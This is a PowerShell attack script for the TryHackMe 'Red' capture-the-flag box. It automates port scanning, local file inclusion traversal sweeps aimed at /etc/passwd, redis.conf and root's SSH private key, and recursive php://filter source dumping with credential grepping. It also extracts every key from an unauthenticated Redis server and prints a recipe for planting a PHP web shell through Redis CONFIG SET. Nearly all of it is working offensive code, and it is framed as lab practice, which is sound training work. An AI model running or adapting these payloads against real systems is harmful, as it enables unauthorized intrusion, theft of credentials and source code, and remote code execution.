<#
.SYNOPSIS
    Dynamic enumeration for TryHackMe "Red" (redisl33t) - authorized lab box.
.DESCRIPTION
    Windows PowerShell 5.1 compatible (no pwsh/PS7 required, no nmap/redis-cli needed).
      * Port scan uses a RunspacePool + BeginConnect/WaitOne (PS5.1-safe concurrency -
        NOT ForEach-Object -Parallel, which is PS7-only and unavailable here, and NOT
        TcpClient.ConnectAsync().Wait(), which was empirically unreliable on this VPN
        adapter and returned false negatives against a known-open port).
      * LFI hits are judged by DIFFING against calibrated good/bad baselines, not by
        matching a single hardcoded string.
      * php://filter source dumps are PARSED for include()/require() targets and
        referenced filenames, which are queued and pulled RECURSIVELY.
      * Every HTML body is scraped for href/src/action and ?page= values, which feed
        both the path list and the LFI candidate list (a mini spider).
      * Redis keys are enumerated, each key's TYPE resolved, and the right
        GET/LRANGE/SMEMBERS/HGETALL issued automatically.
      * All HTTP-based phases (LFI sweep, recursive source pulls, path checks) are
        THROTTLED with a delay between requests - this box has an active-response
        defense that bans/kicks on request bursts, so speed is not the goal here.
.USAGE
    .\enum.ps1 -Target 10.146.184.99
    .\enum.ps1 -Target 10.146.184.99 -FullPortScan -MaxRecursion 60
#>

param(
    [Parameter(Mandatory=$true)][string]$Target,
    [string]$LfiPage        = "index.php",   # the script that does the including
    [string]$Param          = "page",        # the vulnerable parameter name
    [int]$WebPort           = 80,
    [switch]$FullPortScan,
    [int]$PortThreads       = 60,            # runspace pool size for port scan
    [int]$MaxRecursion      = 40,            # cap on runtime-discovered LFI pulls
    [int]$TraversalMaxDepth = 6,             # depth range for ../ sweep (1..N)
    [int]$DelayMs           = 300            # pause between HTTP requests (be gentle)
)

$ErrorActionPreference = 'SilentlyContinue'
$outDir  = Join-Path $PSScriptRoot "loot_$($Target -replace '\.','_')"
New-Item -ItemType Directory -Force -Path $outDir | Out-Null
$logFile = Join-Path $outDir "enum.log"
"" | Out-File $logFile -Encoding utf8

# PS5.1 HTTPS cert bypass shim (harmless if target is HTTP-only; cheap insurance)
try {
    if (-not ([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type) {
        Add-Type -TypeDefinition @"
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
    }
    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
    [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
} catch {}

function Log {
    param([string]$m, [string]$c = 'Gray')
    $line = "[{0}] {1}" -f (Get-Date -Format 'HH:mm:ss'), $m
    Write-Host $line -ForegroundColor $c
    Add-Content -Path $logFile -Value $line -Encoding utf8
}
function Save {
    param([string]$name, [string]$content)
    $p = Join-Path $outDir ($name -replace '[^\w.\-]', '_')
    $content | Out-File $p -Encoding utf8
    return $p
}
function Pace { Start-Sleep -Milliseconds $DelayMs }

# Shared HTTP helper -> returns a small object or $null
function Get-Http {
    param([string]$Uri, [string]$Method = 'Get')
    try {
        $r = Invoke-WebRequest -Uri $Uri -Method $Method -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
        return [pscustomobject]@{ Status = [int]$r.StatusCode; Len = $r.Content.Length; Body = $r.Content }
    } catch {
        $resp = $_.Exception.Response
        if ($resp -and $resp.StatusCode) { return [pscustomobject]@{ Status = [int]$resp.StatusCode.value__; Len = 0; Body = '' } }
        return $null
    }
}

Log "=== Dynamic enum start: $Target ===" Cyan

# ---------------------------------------------------------------------------
# 1. PORT SCAN -- RunspacePool + BeginConnect/WaitOne (PS5.1-safe concurrency)
# ---------------------------------------------------------------------------
Log "--- Port scan ---" Cyan
$commonPorts = @(21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,
                 1521,2049,2375,3000,3128,3306,3389,5000,5432,5900,6000,6379,
                 6380,7000,7001,8000,8008,8080,8081,8443,8888,9000,9090,9200,
                 9418,11211,27017,27018)
$ports = if ($FullPortScan) { 1..65535 } else { $commonPorts }
Log "Scanning $($ports.Count) ports (threads=$PortThreads)..."

function Scan-PortsParallel {
    param([int[]]$PortsToScan, [string]$TargetHost, [int]$MaxThreads, [int]$TimeoutMs = 500)
    $pool = [RunspaceFactory]::CreateRunspacePool(1, $MaxThreads)
    $pool.Open()
    $sb = {
        param($TargetHost, $Port, $TimeoutMs)
        $client = New-Object System.Net.Sockets.TcpClient
        try {
            $iar = $client.BeginConnect($TargetHost, $Port, $null, $null)
            $ok = $iar.AsyncWaitHandle.WaitOne($TimeoutMs)
            if ($ok -and $client.Connected) { $Port }
        } catch {} finally { $client.Close() }
    }
    $jobs = foreach ($p in $PortsToScan) {
        $ps = [PowerShell]::Create()
        $ps.RunspacePool = $pool
        [void]$ps.AddScript($sb).AddArgument($TargetHost).AddArgument($p).AddArgument($TimeoutMs)
        [pscustomobject]@{ Pipe = $ps; Handle = $ps.BeginInvoke() }
    }
    $open = foreach ($j in $jobs) {
        $res = $j.Pipe.EndInvoke($j.Handle)
        $j.Pipe.Dispose()
        if ($res) { $res }
    }
    $pool.Close(); $pool.Dispose()
    return $open | Sort-Object { [int]$_ }
}

$openPorts = Scan-PortsParallel -PortsToScan $ports -TargetHost $Target -MaxThreads $PortThreads
if ($openPorts) { $openPorts | ForEach-Object { Log "OPEN: $_" Green } }
else { Log "No open ports in range." Yellow }

# ---------------------------------------------------------------------------
# 2. WEB ROOT + LINK HARVEST (seed the spider)
# ---------------------------------------------------------------------------
$pathQueue = New-Object 'System.Collections.Generic.HashSet[string]'
$lfiQueue  = New-Object 'System.Collections.Generic.HashSet[string]'

function Harvest-Links {
    param([string]$html)
    foreach ($m in [regex]::Matches($html, '(?:href|src|action)\s*=\s*["'']([^"''#?]+)')) {
        $u = $m.Groups[1].Value.Trim()
        if ($u -match '^(https?:|//|mailto:|javascript:)') { continue }
        $u = $u.TrimStart('/')
        if ($u) { [void]$pathQueue.Add($u) }
    }
    foreach ($m in [regex]::Matches($html, "[?&]$Param=([^""'&<>\s]+)")) {
        [void]$lfiQueue.Add($m.Groups[1].Value.Trim())
    }
}

$webPorts = $openPorts | Where-Object { $_ -in @(80,443,8000,8008,8080,8081,8443,8888,9000,9090,3000,5000,7000,7001) }
if (-not $webPorts -and $openPorts) { $webPorts = @($WebPort) }
foreach ($wp in $webPorts) {
    $scheme = if ($wp -in 443,8443) { 'https' } else { 'http' }
    $base = "${scheme}://${Target}:${wp}/"
    Log "--- Web root: $base ---" Cyan
    $r = Get-Http $base
    if ($r) { Log "[$($r.Status)] len=$($r.Len)"; Save "root_$wp.html" $r.Body | Out-Null; Harvest-Links $r.Body }
    Pace
}

# ---------------------------------------------------------------------------
# 3. LFI -- baseline calibration + recursive, response-driven source pulls
# ---------------------------------------------------------------------------
Log "--- LFI (dynamic) on ${LfiPage}?${Param}= ---" Cyan
$lfiBase = "http://${Target}/${LfiPage}?${Param}="

# 3a. Calibrate THREE outcomes this app can produce, so length-deviation checks
#     don't mistake a known failure mode for a hit:
#     - good:     a real page name                         -> its own content
#     - notfound: valid-looking name, file doesn't exist    -> empty output
#     - redirect: payload fails the "^[a-z]" regex (e.g. starts with . or /)
#                 -> 302's to home.html, so it comes back looking like a hit
#                 unless we know its length ahead of time
$good     = Get-Http ($lfiBase + "contact.html"); Pace
$bad      = Get-Http ($lfiBase + ("zz{0}zz" -f (Get-Random))); Pace
$redirect = Get-Http ($lfiBase + ("../zz{0}zz" -f (Get-Random))); Pace
$goodLen     = if ($good)     { $good.Len }     else { -1 }
$badLen      = if ($bad)      { $bad.Len }      else { -1 }
$redirectLen = if ($redirect) { $redirect.Len } else { -1 }
Log ("baseline  good(contact.html)={0}  notfound(random)={1}  redirect(regex-fail)={2}" -f $goodLen, $badLen, $redirectLen)

function Classify-Lfi {
    param($resp, [string]$payload)
    if (-not $resp) { return $null }
    $body = $resp.Body; $hit = $false; $note = @()
    if ($body -match 'root:.*:0:0:') { $hit = $true; $note += 'unix /etc/passwd' }
    if ($body -match '(?i)(password|passwd|secret|redis|db_|mysql|api[_-]?key)\s*[:=]') { $hit = $true; $note += 'CREDS?' }
    $t = $body.Trim()
    if ($payload -like '*php://filter*' -and $t.Length -gt 24 -and $t -match '^[A-Za-z0-9+/=\r\n]+$') {
        try {
            $dec = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($t -replace '\s', '')))
            return [pscustomobject]@{ Hit = $true; Note = 'b64->source'; Decoded = $dec }
        } catch {}
    }
    if (-not $hit -and $resp.Status -eq 200 -and $resp.Len -gt 0 `
            -and $resp.Len -ne $badLen -and $resp.Len -ne $goodLen -and $resp.Len -ne $redirectLen) {
        $note += 'deviates-from-baseline'
    }
    return [pscustomobject]@{ Hit = $hit; Note = ($note -join ','); Decoded = $null }
}

# 3b. Traversal sweep -- payloads generated across a few encodings and depths
$targetsFiles = @('etc/passwd','etc/hosts','etc/redis/redis.conf','etc/redis.conf',
                  'root/.ssh/id_rsa','var/log/apache2/access.log','proc/self/environ')
$encoders = @(
    { param($d,$f) ('../' * $d) + $f },
    { param($d,$f) ('....//' * $d) + $f },
    { param($d,$f) (('..%2f' * $d) + ($f -replace '/', '%2f')) }
)
foreach ($f in $targetsFiles) {
    foreach ($enc in $encoders) {
        for ($d = 1; $d -le $TraversalMaxDepth; $d++) {
            $p = & $enc $d $f
            $resp = Get-Http ($lfiBase + $p)
            Pace
            $cls = Classify-Lfi $resp $p
            if ($cls -and ($cls.Hit -or $cls.Note -match 'deviates')) {
                Log ("  HIT [$($resp.Status)] len=$($resp.Len) :: $p  <<$($cls.Note)>>") Green
                Save ("lfi_" + $p) $resp.Body | Out-Null
                break
            }
        }
    }
}

# 3c. RECURSIVE php://filter source extraction (also covers absolute-path reads
#     directly, since this box's filter only strips one pass of ../ and ./ and
#     never touches php://, so absolute paths need no traversal at all)
'index.php','config.php','config.inc.php','db.php','database.php','connect.php',
'redis.php','functions.php','header.php','footer.php','contact.php','about.php',
'.env','flag.php' | ForEach-Object { [void]$lfiQueue.Add($_) }

$pulled = New-Object 'System.Collections.Generic.HashSet[string]'
$count  = 0
function Extract-Refs {
    param([string]$src)
    $found = @()
    foreach ($m in [regex]::Matches($src, '(?:include|require)(?:_once)?\s*\(?\s*["'']([^"'']+)["'']')) { $found += $m.Groups[1].Value }
    foreach ($m in [regex]::Matches($src, '["'']([\w./\-]+\.(?:php|inc|conf|env))["'']')) { $found += $m.Groups[1].Value }
    $found | ForEach-Object { ($_ -replace '^\./', '').Trim() } | Where-Object { $_ -and $_.Length -lt 80 } | Select-Object -Unique
}

while ($lfiQueue.Count -gt 0 -and $count -lt $MaxRecursion) {
    $name = $lfiQueue | Select-Object -First 1
    [void]$lfiQueue.Remove($name)
    if ($pulled.Contains($name)) { continue }
    [void]$pulled.Add($name); $count++

    $payload = "php://filter/convert.base64-encode/resource=$name"
    $resp = Get-Http ($lfiBase + $payload)
    Pace
    $cls = Classify-Lfi $resp $payload
    if ($cls -and $cls.Decoded) {
        $sp = Save ("src_$name.txt") $cls.Decoded
        Log ("  SOURCE  $name -> $sp") Green
        foreach ($ln in ($cls.Decoded -split "`n" | Select-String -Pattern '(?i)\b(pass(word)?|secret|redis|db_?host|user(name)?|api[_-]?key)\b\s*[:=]')) {
            Log ("    cred? $($ln.ToString().Trim())") Yellow
        }
        foreach ($ref in (Extract-Refs $cls.Decoded)) {
            if (-not $pulled.Contains($ref)) { [void]$lfiQueue.Add($ref); Log "    + queued (from source): $ref" }
        }
    }
}
Log "LFI source pulls: $count (recursion cap=$MaxRecursion)"

# ---------------------------------------------------------------------------
# 4. REDIS -- typed key dump + auto RCE recipe
# ---------------------------------------------------------------------------
function Invoke-Redis {
    param([string]$Cmd, [int]$Port = 6379)
    try {
        $c = New-Object System.Net.Sockets.TcpClient
        $c.Connect($Target, $Port)
        $s = $c.GetStream()
        $w = New-Object System.IO.StreamWriter($s); $w.NewLine = "`r`n"; $w.AutoFlush = $true
        $w.WriteLine($Cmd)
        Start-Sleep -Milliseconds 400
        $buf = New-Object byte[] 65536; $sb = New-Object Text.StringBuilder
        while ($s.DataAvailable) {
            $n = $s.Read($buf, 0, $buf.Length)
            if ($n -le 0) { break }
            [void]$sb.Append([Text.Encoding]::UTF8.GetString($buf, 0, $n))
        }
        $c.Close()
        return $sb.ToString()
    } catch { return "ERROR: $($_.Exception.Message)" }
}

if ($openPorts -contains 6379) {
    Log "--- Redis 6379 ---" Cyan
    $ping = Invoke-Redis "PING"
    Log "PING => $($ping.Trim())"
    if ($ping -match 'PONG') {
        Log "Redis UNAUTHENTICATED" Green
        Save "redis_info.txt" (Invoke-Redis "INFO") | Out-Null
        $dir = (Invoke-Redis "CONFIG GET dir") -split "`r`n" | Select-Object -Last 2 | Select-Object -First 1
        $dbf = (Invoke-Redis "CONFIG GET dbfilename") -split "`r`n" | Select-Object -Last 2 | Select-Object -First 1
        Log "dir=$dir  dbfilename=$dbf"
        $keysRaw = Invoke-Redis "KEYS *"
        $keys = ($keysRaw -split "`r`n") | Where-Object { $_ -and $_ -notmatch '^\*|^\$|^\+|ERROR' }
        foreach ($k in $keys) {
            $type = ((Invoke-Redis "TYPE $k") -split "`r`n" | Select-Object -Last 2 | Select-Object -First 1).Trim()
            $dumpCmd = switch ($type) {
                'list'  { "LRANGE $k 0 -1" }
                'set'   { "SMEMBERS $k" }
                'hash'  { "HGETALL $k" }
                'zset'  { "ZRANGE $k 0 -1 WITHSCORES" }
                default { "GET $k" }
            }
            $val = Invoke-Redis $dumpCmd
            Log "  key '$k' ($type) => $($val.Trim())" Green
            Save "redis_key_$k.txt" $val | Out-Null
        }
        Log "RCE recipe (if web root writable via dir):" Yellow
        Log "  CONFIG SET dir /var/www/html; CONFIG SET dbfilename shell.php" Yellow
        Log "  SET x '<?php system(\$_GET[0]); ?>'; SAVE  -> then ${LfiPage}?${Param}=shell" Yellow
    } else { Log "No PONG (auth required or not Redis)." Yellow }
} else { Log "6379 not open (try -FullPortScan)." Yellow }

# ---------------------------------------------------------------------------
# 5. PATH CHECK (seed list + everything the spider harvested), throttled
# ---------------------------------------------------------------------------
Log "--- Path check (seed + harvested) ---" Cyan
'index.php','config.php','db.php','login.php','admin.php','robots.txt','.git/HEAD',
'.env','backup.zip','info.php','phpinfo.php','uploads/','flag.txt','flag.php' |
    ForEach-Object { [void]$pathQueue.Add($_) }
foreach ($w in $pathQueue) {
    $r = Get-Http "http://${Target}/$w" 'Head'
    if ($r -and $r.Status -ne 404) { Log "[$($r.Status)] /$w" Green }
    Pace
}

Log "=== Done. Loot: $outDir ===" Cyan
Log "Review: src_*.txt (dumped source), redis_key_*.txt, lfi_*.txt" Cyan
